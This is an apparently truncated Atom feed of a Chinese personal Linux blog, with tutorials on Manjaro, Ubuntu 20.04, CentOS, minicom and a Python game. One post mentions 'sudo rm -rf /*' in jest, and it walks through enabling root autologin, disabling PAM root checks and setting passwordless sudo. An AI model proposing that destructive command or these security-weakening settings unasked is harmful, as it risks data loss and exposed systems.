<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>CAIJINBO</title>
  <icon>https://www.gravatar.com/avatar/df687bae53da17be25bf911724d042ec</icon>
  <subtitle>努力发挥创造力</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://caijinbo.work/"/>
  <updated>2020-06-13T00:47:15.689Z</updated>
  <id>https://caijinbo.work/</id>
  
  <author>
    <name>caijinbo</name>
    <email>caijinbo_mail@163.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>manjaro百度网盘打不开解决方法</title>
    <link href="https://caijinbo.work/2020/06/11/2020-06-12-manjaro%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%89%93%E4%B8%8D%E5%BC%80%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
    <id>https://caijinbo.work/2020/06/11/2020-06-12-manjaro%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%E6%89%93%E4%B8%8D%E5%BC%80%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</id>
    <published>2020-06-11T16:00:00.000Z</published>
    <updated>2020-06-13T00:47:15.689Z</updated>
    
    <content type="html"><![CDATA[<p> 最近更新了一下百度网盘之后，发现打不开了，就是在百度网盘启动界面一直在加载状态，一开始我以为是软件不兼容的问题，就重装软件了，但发现还是一样，重启系统还是一样，就上网找答案，找到了一个有效答案，在网络上找答案太混杂，容易鱼目混珠，杂七杂八的答案都有，所以写篇博客记录一下。</p><a id="more"></a><p>故障现象：</p><p>百度网盘linux版本更新之后就打不开了，一直处在加载状态</p><p>解决方法:</p><p>删除百度网盘的配置文件</p><p>sudo rm -rf /home/username/.local/share/baidu/</p><p>username是用户的名字</p><p>到此搞定。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt; 最近更新了一下百度网盘之后，发现打不开了，就是在百度网盘启动界面一直在加载状态，一开始我以为是软件不兼容的问题，就重装软件了，但发现还是一样，重启系统还是一样，就上网找答案，找到了一个有效答案，在网络上找答案太混杂，容易鱼目混珠，杂七杂八的答案都有，所以写篇博客记录一下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python编写石头剪刀布游戏</title>
    <link href="https://caijinbo.work/2020/06/02/2020-06-03-python%E7%BC%96%E5%86%99%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83%E6%B8%B8%E6%88%8F/"/>
    <id>https://caijinbo.work/2020/06/02/2020-06-03-python%E7%BC%96%E5%86%99%E7%9F%B3%E5%A4%B4%E5%89%AA%E5%88%80%E5%B8%83%E6%B8%B8%E6%88%8F/</id>
    <published>2020-06-02T16:00:00.000Z</published>
    <updated>2020-06-03T06:38:24.327Z</updated>
    
    <content type="html"><![CDATA[<p>平时在生活中难免会遇到两个人要面临不同选择的时候，石头剪刀布就是常用的伎俩，简单又粗暴，但真人玩石头剪刀布的时候难免会出现一些错误，例如，双方出拳速度不一样又或者出错拳，还有就是出拳规律被对方掌握了等，这些情况就导致了不公平的现象发生。为了解决这个问题，使用Python编写一个石头剪刀布小游戏，就可以保证游戏的公平性了。</p><a id="more"></a><p>网络上有很多现成的Python案例了，我看了别人写的案例，虽然能用，但不能满足我的需求，所以我借鉴了网上的案例而改写了满足自己需求的石头剪刀布小游戏。</p><pre><code class="Python">&quot;&quot;&quot;石头剪刀布游戏三次机会只需要输入1,2,3数字&quot;&quot;&quot;import randomcount = 3while count:    a = input(&quot;请出拳（石头1/剪刀2/布3)：&quot;)    if a in [&#39;1&#39;, &#39;2&#39;, &#39;3&#39;]:        if a == &#39;1&#39;:            c = &#39;石头&#39;        elif a == &#39;2&#39;:            c = &#39;剪刀&#39;        elif a == &#39;3&#39;:            c = &#39;布&#39;    else:        print(&#39;只能选择1~3之间的数字&#39;)        continue    b = [&#39;剪刀&#39;, &#39;石头&#39;, &#39;布&#39;]    # 定义赢的列表    win_list = [[&#39;石头&#39;, &#39;剪刀&#39;], {&#39;剪刀&#39;, &#39;布&#39;}, [&#39;布&#39;, &#39;石头&#39;]]    # 电脑随机选择出拳    computer = random.choice(b)    print(&#39;你出拳：&#39;, c)    print(&quot;电脑出拳：&quot;, computer)    if c in b:        count -= 1        if c == computer:            print(&quot;平局&quot;)        elif [c, computer] in win_list:            # 如果在赢的列表中，代表你赢了            print(&quot;恭喜，你赢了&quot;)        else:            print(&quot;很遗憾，你输了&quot;)    print(&quot;你还剩余机会&quot;, count)</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;平时在生活中难免会遇到两个人要面临不同选择的时候，石头剪刀布就是常用的伎俩，简单又粗暴，但真人玩石头剪刀布的时候难免会出现一些错误，例如，双方出拳速度不一样又或者出错拳，还有就是出拳规律被对方掌握了等，这些情况就导致了不公平的现象发生。为了解决这个问题，使用Python编写一个石头剪刀布小游戏，就可以保证游戏的公平性了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="https://caijinbo.work/categories/python/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>linux连接交换机console</title>
    <link href="https://caijinbo.work/2020/05/29/2020-05-30-linux%E8%BF%9E%E6%8E%A5%E4%BA%A4%E6%8D%A2%E6%9C%BAconsole/"/>
    <id>https://caijinbo.work/2020/05/29/2020-05-30-linux%E8%BF%9E%E6%8E%A5%E4%BA%A4%E6%8D%A2%E6%9C%BAconsole/</id>
    <published>2020-05-29T16:00:00.000Z</published>
    <updated>2020-05-30T09:30:01.084Z</updated>
    
    <content type="html"><![CDATA[<p>自从用了linux做主力系统之后，有很多习惯都要改变了，今天想连接一台交换机，结果方法跟windows一点也不相同，我也是通过网络上的教程才连上的，特意写个自己总结后的文章，方便自己后面查看。</p><a id="more"></a><h3 id="第一步：查看usb端口名称"><a href="#第一步：查看usb端口名称" class="headerlink" title="第一步：查看usb端口名称"></a>第一步：查看usb端口名称</h3><p>sudo dmesg | grep usb</p><h3 id="第二步：安装minicom"><a href="#第二步：安装minicom" class="headerlink" title="第二步：安装minicom"></a>第二步：安装minicom</h3><p> sudo apt install minicom<br>        sudo yum install minicom<br>        sudo  pacman -S minicom</p><p>manjaro 可以通过软件商店安装</p><h3 id="第三步：打开minicom设置"><a href="#第三步：打开minicom设置" class="headerlink" title="第三步：打开minicom设置"></a>第三步：打开minicom设置</h3><p>sudo minicom -s</p><pre><code>        +-----[configuration]------+        | Filenames and paths      |        | File transfer protocols  |        | Serial port setup        |        | Modem and dialing        |        | Screen and keyboard      |        | Save setup as dfl        |        | Save setup as..          |        | Exit                     |        | Exit from Minicom        |        +--------------------------+</code></pre><p>选中 | Serial port setup        |  回车</p><pre><code>+-----------------------------------------------------------------------+| A -    Serial Device      : /dev/ttyUSB0                              || B - Lockfile Location     : /var/run                                  || C -   Callin Program      :                                           || D -  Callout Program      :                                           || E -    Bps/Par/Bits       : 9600 8N1                                  || F - Hardware Flow Control : No                                        || G - Software Flow Control : No                                        ||                                                                       ||    Change which setting?                                              |+-----------------------------------------------------------------------+</code></pre><p>选择A 修改相应的usb名称<br>       选择E  修改波特率9600<br>       选择F 将Yes改为No    </p><p>我的设置如下：<br>A -    Serial Device      : /dev/ttyUSB0                                                    我的机器只有一个串口，所以为0<br>B - Lockfile Location     : /var/run                                                    lockfile路径默认<br>C -   Callin Program      :<br>D -  Callout Program      :<br>E -    Bps/Par/Bits       : 9600 8N1                                                    设置波特率 9600<br>F - Hardware Flow Control : No                                                      关闭硬件流量控制<br>G - Software Flow Control : No                                                       关闭软件流量控制</p><p>设置完后按回车确认。</p><h3 id="第四步：保存设置"><a href="#第四步：保存设置" class="headerlink" title="第四步：保存设置"></a>第四步：保存设置</h3><p>选中   | Save setup as dfl        |    回车<br>       选中   | Exit from Minicom        |   回车退出</p><h3 id="第五步：连接交换机console"><a href="#第五步：连接交换机console" class="headerlink" title="第五步：连接交换机console"></a>第五步：连接交换机console</h3><p>sudo minicom</p><p>注意：连接之后可能没有反应，按几下回车便有显示。</p><p>连接界面如下：</p><pre><code>Welcome to minicom 2.7.1OPTIONS: I18n Compiled on Sep 28 2019, 15:24:37.Port /dev/ttyUSB0, 16:13:18Press CTRL-A Z for help on special keysRuijie&gt;Ruijie&gt;enPassword:*********Ruijie#</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自从用了linux做主力系统之后，有很多习惯都要改变了，今天想连接一台交换机，结果方法跟windows一点也不相同，我也是通过网络上的教程才连上的，特意写个自己总结后的文章，方便自己后面查看。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>manjaro安装deb包</title>
    <link href="https://caijinbo.work/2020/05/25/2020-05-26-manjaro%E5%AE%89%E8%A3%85deb%E5%8C%85/"/>
    <id>https://caijinbo.work/2020/05/25/2020-05-26-manjaro%E5%AE%89%E8%A3%85deb%E5%8C%85/</id>
    <published>2020-05-25T16:00:00.000Z</published>
    <updated>2020-05-26T14:06:29.388Z</updated>
    
    <content type="html"><![CDATA[<p>manjaro自带的软件商店已经有很多软件了，基本上能够满足日常使用的需求，如果没有，后面还有个AUR（yay）撑着，pacman和yay两者几乎能解决普通用户需求的所有软件，除个别软件例外……例如simplenote</p><a id="more"></a><p>自从用了linux做了主力系统之后，就喜欢上了一个软件simplenote，它是一个免费开源跨平台的一个笔记软件，以简单著称。我用windows系统时一直都是使用OneNote，但OneNote没有linux系统版本，于是我被迫去寻找一个替代品，在网络上很多人都推荐simplenote，我试用了以后，就将它列为了linux系统必装的软件。从ubuntu系统换成manjaro系统之后发现pacman和yay上都没有这个包，一开始我打算下载simplenote的源码包进行编译安装的，但我在网络上看到了一种安装deb包的方法，所以试了一下。</p><h4 id="安装流程："><a href="#安装流程：" class="headerlink" title="安装流程："></a>安装流程：</h4><p>使用debtap工具进行解包</p><p>首先查看电脑上是否安装过<br>sudo pacman -Q debtap</p><p>安装yay工具<br>sudo pacman -S yay</p><p>安装解包打包工具debtap<br>yay -S debtap</p><p>升级debtap<br>sudo debtap -u</p><p>先去官网下载simplenote的deb包。</p><p>解包<br>sudo debtap Simplenote-linux-1.16.0-amd64.deb</p><p>安装<br>sudo pacman -U simplenote-1.16.0-1-x86_64.pkg.tar.zst</p><p>到此就安装完成了，我亲自测试使用，没有发现什么问题。</p><p>后面我又需要安装xmind，pacman上没有包，用yay -S xmind安装会报错，于是我又用了安装deb包的方法安装了，也能正常使用。对普通用户来说还是挺方便的。喜欢复杂点的就建议使用编译源码包的方法安装。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;manjaro自带的软件商店已经有很多软件了，基本上能够满足日常使用的需求，如果没有，后面还有个AUR（yay）撑着，pacman和yay两者几乎能解决普通用户需求的所有软件，除个别软件例外……例如simplenote&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>manjaro显示伪输出</title>
    <link href="https://caijinbo.work/2020/05/25/2020-05-26-manjaro%E6%98%BE%E7%A4%BA%E4%BC%AA%E8%BE%93%E5%87%BA/"/>
    <id>https://caijinbo.work/2020/05/25/2020-05-26-manjaro%E6%98%BE%E7%A4%BA%E4%BC%AA%E8%BE%93%E5%87%BA/</id>
    <published>2020-05-25T16:00:00.000Z</published>
    <updated>2020-05-27T04:55:35.431Z</updated>
    
    <content type="html"><![CDATA[<p>manjaro没有声音输出，显示伪输出</p><a id="more"></a><h3 id="故障现象："><a href="#故障现象：" class="headerlink" title="故障现象："></a>故障现象：</h3><p>网页播放视频的时候发现没有声音输出，用其他软件也没有声音输出，检查过并没有调静音的操作。查看系统设置声音选项那里显示输出设备显示“伪输出”，正常情况下应该是“扬声器-内置音频”。</p><p>附加：还有一种情况，也是我刚遇到的，就是电脑要接入一个显示器，然后电脑就没声音了，去看一下声音选项那里也是看不到“扬声器-内置音频”了，处理手法也是跟下面一样。</p><p>这是两种遇到概率较高的故障现象，所以拿出来讲讲。</p><h3 id="故障原因分析："><a href="#故障原因分析：" class="headerlink" title="故障原因分析："></a>故障原因分析：</h3><p>可能是之前在网页播放视频时，并没有退出播放视频的页面就直接盖下笔记本盖子了，后面打开笔记本盖子时，声音程序（pulseaudio ）并没有唤醒。</p><h3 id="故障处理："><a href="#故障处理：" class="headerlink" title="故障处理："></a>故障处理：</h3><p>打开系统检测器：<br>搜索输入：pulseaudio<br>从显示上可以看出pulseaudio 正处于睡眠状态。<br>选中pulseaudio 选择结束进程，结束后它会自动重启。<br>再次查看显示状态是运行状态。<br>查看系统设置声音选项显示已经是“扬声器-内置音频”。<br>打开网页视频已经正常有声音。</p><h3 id="结语："><a href="#结语：" class="headerlink" title="结语："></a>结语：</h3><p>遇到问题仔细看下故障现象，然后推断一下故障的原因，总是能找到蛛丝马迹的，如果实在想不到就上网查下，不要硬着头皮在那里想半天。<br>处理的方法有多种，可以用top、ps之类的，找到PID进程号杀掉就行了。我用的是manjaro桌面系统，为了省事就直接打开图形的系统监视器处理了，当然重启系统也是可以解决问题的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;manjaro没有声音输出，显示伪输出&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="linux" scheme="https://caijinbo.work/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>manjaro的优点</title>
    <link href="https://caijinbo.work/2020/05/22/2020-05-23-manjaro%E7%9A%84%E4%BC%98%E7%82%B9/"/>
    <id>https://caijinbo.work/2020/05/22/2020-05-23-manjaro%E7%9A%84%E4%BC%98%E7%82%B9/</id>
    <published>2020-05-22T16:00:00.000Z</published>
    <updated>2020-05-23T03:38:24.624Z</updated>
    
    <content type="html"><![CDATA[<p>前段时间，我在物理机上安装了最新的ubuntu20.04，使用体验挺不好的，linux桌面版还有很长的路要走，后面我心灰意冷的用回了win10，毕竟电脑在使用过程中，稳定才是王道。换回windows系统之后，我不是很甘心，因为我只用了ubuntu20.04就否定了linux桌面版，这明显是很不严谨的定论，于是，我又开始折腾了。</p><a id="more"></a><p>我搜索了一番之后，目标定在了kali、Fedora、manjaro这三大系统上面，kali代表debian阵容、Fedora代表redhat阵容、manjaro代表arch阵容，经过一番筛检之后，我最后选择了manjaro，筛检的原因也很简单，kali在虚拟机上使用了很长时间了，我是挺喜欢它的，但不够稳定，我曾试过更新kali后重启就进不了系统了。现在新版本的kali可能比较稳定了，但选择主力系统时还是力求稳定为主，所以kali只能继续呆在我的虚拟机上了。我在虚拟机上也试用了Fedora、manjaro，我想尽可能的找出他们的优点和缺点，对比了一番，发现两者都很优秀，Fedora有一个点让我放弃了，就是它的gnome dock不能定制，我更喜欢的是像ubuntu那样的dock，看起来有特色，manjaro可以定制。</p><p>物理机使用了manjaro十多天后，我简单的概述一下它的优点和缺点</p><ol><li><p>界面漂亮颜值高</p></li><li><p>定制性更高</p></li><li><p>软件库资源非常多，几乎能涵盖了日常使用所需的软件</p></li><li><p>能够通过自带的软件安装最新版本的显卡驱动，简单方便</p></li><li><p>稳定性更高，至上比ubuntu高了去了</p></li><li><p>系统更加完善，并没有ubuntu那么多bug</p></li><li><p>招牌优点：滚动性更新，我喜欢这点</p></li><li><p>安装使用搜狗输入法，这点也好评，毕竟搜狗输入法linux版本还是挺好用的</p></li><li><p>这是能够作为主力系统的代表性linux系统</p></li></ol><p>虽然我还是采用win10+manjaro双系统的形式，但我已经渐渐地忘记了windows系统了，这段时间都在用manjaro，目前为止还没发现重大的缺点，如果有人想使用linux系统作为主力系统，我会推荐manjaro。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前段时间，我在物理机上安装了最新的ubuntu20.04，使用体验挺不好的，linux桌面版还有很长的路要走，后面我心灰意冷的用回了win10，毕竟电脑在使用过程中，稳定才是王道。换回windows系统之后，我不是很甘心，因为我只用了ubuntu20.04就否定了linux桌面版，这明显是很不严谨的定论，于是，我又开始折腾了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="https://caijinbo.work/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="linux" scheme="https://caijinbo.work/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>体验ubuntu20.04的使用感受</title>
    <link href="https://caijinbo.work/2020/05/15/2020-05-16-%E4%BD%93%E9%AA%8Cubuntu20.04%E7%9A%84%E4%BD%BF%E7%94%A8%E6%84%9F%E5%8F%97/"/>
    <id>https://caijinbo.work/2020/05/15/2020-05-16-%E4%BD%93%E9%AA%8Cubuntu20.04%E7%9A%84%E4%BD%BF%E7%94%A8%E6%84%9F%E5%8F%97/</id>
    <published>2020-05-15T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.112Z</updated>
    
    <content type="html"><![CDATA[<p>从ubuntu20.04 四月二十四日发布到现在，我使用了有二十来天了，今天就简单说下使用感受。我装的是win10与ubuntu双系统。</p><a id="more"></a><h4 id="优点："><a href="#优点：" class="headerlink" title="优点："></a>优点：</h4><p>界面新鲜且好看</p><p>你没看错，就一条优点而已</p><h4 id="缺点："><a href="#缺点：" class="headerlink" title="缺点："></a>缺点：</h4><ol><li><p>驱动是个绝对硬伤，所有驱动都是兼容性驱动，勉强能用，但效果不理想。</p></li><li><p>时而会有花屏现象。</p></li><li><p>我连的是蓝牙鼠标，会经常卡一下。</p></li><li><p>声音就是听个响，音质实在不敢恭维。</p></li><li><p>屏幕亮度也是个硬伤，每次开机都是恢复到一个亮度，偏亮，不能记录亮度，日志天天报错：Failed to get backlight or LED device ‘backlight:nvidia_0’: No such device</p></li><li><p>不会自动息屏，我已经设置了五分钟息屏，但没有用，屏幕会一直亮着。</p></li><li><p>程序经常卡死崩溃，实在是不稳定。</p></li><li><p>系统也不稳定，我都已经重装过一次系统了，因为gnome-shell频繁占用cpu 100%，但找不出是什么原因导致占用cpu100%的，只能重装了事。</p></li><li><p>自带的ibus输入法实在是难用的要命，我现在装的是谷歌拼音，因为搜狗还不兼容，装不了。</p></li><li><p>软件也是个绝对硬伤，更新慢，软件少，且有太多的软件还不兼容ubuntu20.04了，这是大多数用户望而却步的鸿沟了。</p></li><li><p>国产软件几乎都还不兼容20.04</p></li><li><p>点击左下角的显示应用程序按钮时，结果显示经常会有图标重叠现象，要再多点击一下才会正常，强迫症表示难受。</p></li><li><p>自带的软件商店真的是难用，绝对差评。</p></li><li><p>打开几个虚拟机就卡死，内存管理机制还是不够完善。</p></li><li><p>还有很多我没有列出来。。。</p></li></ol><h4 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h4><p>实在是有太多缺点了，说都说不完，这系统给人的感觉就是个测试版的系统，不成熟且容易崩。bug多的数不过来。linux系统在服务器领域是个非常牛逼的存在，但在桌面领域还有很长的路要走。建议还是在虚拟机上尝试ubuntu20.04即可，在物理机上实在是太折腾了。还有，这么多缺点的系统我为什么还在用？因为我看中的是它的优点。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从ubuntu20.04 四月二十四日发布到现在，我使用了有二十来天了，今天就简单说下使用感受。我装的是win10与ubuntu双系统。&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="https://caijinbo.work/categories/%E9%9A%8F%E7%AC%94/"/>
    
    
      <category term="随笔" scheme="https://caijinbo.work/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>linux 生成、查看文件的MD5、SHA、SHA256值</title>
    <link href="https://caijinbo.work/2020/05/11/2020-05-12-%E7%94%9F%E6%88%90%E3%80%81%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84MD5%E3%80%81SHA%E3%80%81SHA256%E5%80%BC/"/>
    <id>https://caijinbo.work/2020/05/11/2020-05-12-%E7%94%9F%E6%88%90%E3%80%81%E6%9F%A5%E7%9C%8B%E6%96%87%E4%BB%B6%E7%9A%84MD5%E3%80%81SHA%E3%80%81SHA256%E5%80%BC/</id>
    <published>2020-05-11T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.108Z</updated>
    
    <content type="html"><![CDATA[<p>Linux系统生成MD5、SHA、SHA256</p><p>md5sum filename  &gt;&gt; MD5.txt</p><p>sha1sum filename &gt;&gt; SHA1.txt</p><p>sha256sum filename &gt;&gt; SHA256.txt</p><a id="more"></a><p>Linux系统查看 MD5、SHA、SHA256</p><p>md5sum filename</p><p>sha1sum filename</p><p>sha256sum filename</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Linux系统生成MD5、SHA、SHA256&lt;/p&gt;
&lt;p&gt;md5sum filename  &amp;gt;&amp;gt; MD5.txt&lt;/p&gt;
&lt;p&gt;sha1sum filename &amp;gt;&amp;gt; SHA1.txt&lt;/p&gt;
&lt;p&gt;sha256sum filename &amp;gt;&amp;gt; SHA256.txt&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="教程" scheme="https://caijinbo.work/tags/%E6%95%99%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>centos7.7升级到centos7.8</title>
    <link href="https://caijinbo.work/2020/05/10/2020-05-11-centos7.7%E5%8D%87%E7%BA%A7%E5%88%B0centos7.8/"/>
    <id>https://caijinbo.work/2020/05/10/2020-05-11-centos7.7%E5%8D%87%E7%BA%A7%E5%88%B0centos7.8/</id>
    <published>2020-05-10T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.104Z</updated>
    
    <content type="html"><![CDATA[<p>最近发布了CentOS7.8，算是常规更新吧，变化不大，我的服务器使用的是7.7，就打算升级到7.8  步骤如下。</p><a id="more"></a><h3 id="1-备份："><a href="#1-备份：" class="headerlink" title="1.备份："></a>1.备份：</h3><p>数据备份，带有任何不确定性操作之前都需要进行数据备份。</p><h3 id="2-查看系统版本："><a href="#2-查看系统版本：" class="headerlink" title="2.查看系统版本："></a>2.查看系统版本：</h3><p>cat /etc/redhat-release</p><h3 id="3-更新yum源"><a href="#3-更新yum源" class="headerlink" title="3.更新yum源"></a>3.更新yum源</h3><p>yum默认的镜像很慢，需要更新国内镜像</p><p>cd  /etc/yum.repos.d/    </p><p>wget <a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo" target="_blank" rel="noopener">http://mirrors.163.com/.help/CentOS7-Base-163.repo      </a></p><p>cp CentOS-Base.repo  CentOS-Base.repo.bak    </p><p>cp CentOS7-Base-163.repo   CentOS-Base.repo</p><h3 id="4-检查是否可更新到7-8"><a href="#4-检查是否可更新到7-8" class="headerlink" title="4.检查是否可更新到7.8"></a>4.检查是否可更新到7.8</h3><p>yum check-update  | grep centos-release </p><h3 id="5-更新"><a href="#5-更新" class="headerlink" title="5.更新"></a>5.更新</h3><p>sudo yum update</p><p>更新完成，会看到Complete!</p><h3 id="6-检查一下："><a href="#6-检查一下：" class="headerlink" title="6.检查一下："></a>6.检查一下：</h3><p>cat  /etc/redhat-release </p><h3 id="7-重启"><a href="#7-重启" class="headerlink" title="7.重启"></a>7.重启</h3><p>reboot</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近发布了CentOS7.8，算是常规更新吧，变化不大，我的服务器使用的是7.7，就打算升级到7.8  步骤如下。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="linux" scheme="https://caijinbo.work/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu20.04设置普通用户sudo不用输密码</title>
    <link href="https://caijinbo.work/2020/05/09/2020-05-10-ubuntu20.04%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo%E4%B8%8D%E7%94%A8%E8%BE%93%E5%AF%86%E7%A0%81/"/>
    <id>https://caijinbo.work/2020/05/09/2020-05-10-ubuntu20.04%E8%AE%BE%E7%BD%AE%E6%99%AE%E9%80%9A%E7%94%A8%E6%88%B7sudo%E4%B8%8D%E7%94%A8%E8%BE%93%E5%AF%86%E7%A0%81/</id>
    <published>2020-05-09T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.100Z</updated>
    
    <content type="html"><![CDATA[<p>现在很多的linux系统都禁止使用root用户登录了，在装系统的时候都强制要创办一个普通用户，虽然用意是为了系统安全，但使用过程中就遇到了一个问题，就是使用sudo的时候要频繁输入密码，实在是太麻烦了。</p><a id="more"></a><p><strong>一般解决方法有两种：</strong></p><h3 id="第一种方法：设置root用户自动登录"><a href="#第一种方法：设置root用户自动登录" class="headerlink" title="第一种方法：设置root用户自动登录"></a>第一种方法：设置root用户自动登录</h3><p>这个确实是非常直接的解决办法，ubuntu20.04默认是禁止使用root用户登录，但我们可以手动设置root用户登录，然后为所欲为。其设置过程也不难，linux系统是开源的，系统的所有设置都可以修改，只要你开心，你修改内核也是可以的，甚至一兴奋执行sudo rm -rf /* 也是没人会拦你的，毕竟你的系统是真正的由你做主的，当然咯，在自己的电脑上才可以这么任性，在生产环境就得以安全为主了。</p><p>设置方法：</p><h4 id="1-设置root密码"><a href="#1-设置root密码" class="headerlink" title="1.设置root密码"></a>1.设置root密码</h4><p><code>sudo passwd root</code></p><h4 id="2-设置50-unity-conf"><a href="#2-设置50-unity-conf" class="headerlink" title="2.设置50-unity.conf"></a>2.设置50-unity.conf</h4><p><code>sudo vim /usr/share/lightdm/lightdm.conf.d/50-unity.conf</code></p><pre><code class="bash">[Seat:*]user-session=ubuntuautologin-guest=falseautologin-user=rootautologin-user-timeout=0greeter-session=lightdm-gtk-greeter</code></pre><h4 id="3-修改-etc-pam-d-下文件"><a href="#3-修改-etc-pam-d-下文件" class="headerlink" title="3.修改/etc/pam.d/下文件"></a>3.修改/etc/pam.d/下文件</h4><p><code>sudo vim /etc/pam.d/gdm-autologin</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><p><code>sudo vim /etc/pam.d/gdm-password</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><p><code>sudo vim /etc/pam.d/gdm-fingerprint</code></p><pre><code class="bash">#auth   required    pam_succeed_if.so user != root quiet_success</code></pre><h4 id="4-修改-root-profile文件"><a href="#4-修改-root-profile文件" class="headerlink" title="4.修改/root/.profile文件"></a>4.修改/root/.profile文件</h4><p><code>sudo vim /root/.profile</code><br> 文档最后一行 mesg n || true 前添加 tty -s &amp;&amp; 即 tty -s &amp;&amp;mesg n || true</p><h4 id="5-修改-etc-gdm3-custom-conf"><a href="#5-修改-etc-gdm3-custom-conf" class="headerlink" title="5.修改/etc/gdm3/custom.conf"></a>5.修改/etc/gdm3/custom.conf</h4><p><code>sudo vim /etc/gdm3/custom.conf</code></p><pre><code class="bash"># Enabling automatic loginAutomaticLoginEnable = trueAutomaticLogin = root</code></pre><p>这种方法有个弊端，出于安全原因，谷歌浏览器和VLC播放器无法使用了。谷歌浏览器只能在普通用户下使用，因为我是要使用谷歌浏览器的，所以我要妥协用回普通用户了。</p><h3 id="第二种方法：设置普通用户sudo不用输密码"><a href="#第二种方法：设置普通用户sudo不用输密码" class="headerlink" title="第二种方法：设置普通用户sudo不用输密码"></a>第二种方法：设置普通用户sudo不用输密码</h3><p>网络上有很多种方法，但不使用ubuntu20.04，后面才查到了这个方法，亲测有效。</p><p><code>sudo vim /etc/sudoers</code></p><pre><code class="bash">%sudo   ALL=(ALL:ALL) ALL   修改为  %sudo   ALL=(ALL:ALL) NOPASSWD:ALL</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;现在很多的linux系统都禁止使用root用户登录了，在装系统的时候都强制要创办一个普通用户，虽然用意是为了系统安全，但使用过程中就遇到了一个问题，就是使用sudo的时候要频繁输入密码，实在是太麻烦了。&lt;/p&gt;
    
    </summary>
    
    
      <category term="教程" scheme="https://caijinbo.work/categories/%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="linux" scheme="https://caijinbo.work/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>ubuntu20.04 安装shadowsocks-qt5</title>
    <link href="https://caijinbo.work/2020/05/07/ubuntu20.04-%E5%AE%89%E8%A3%85shadowsocks-qt5/"/>
    <id>https://caijinbo.work/2020/05/07/ubuntu20.04-%E5%AE%89%E8%A3%85shadowsocks-qt5/</id>
    <published>2020-05-07T16:00:00.000Z</published>
    <updated>2020-05-20T00:11:06.132Z</updated>
    
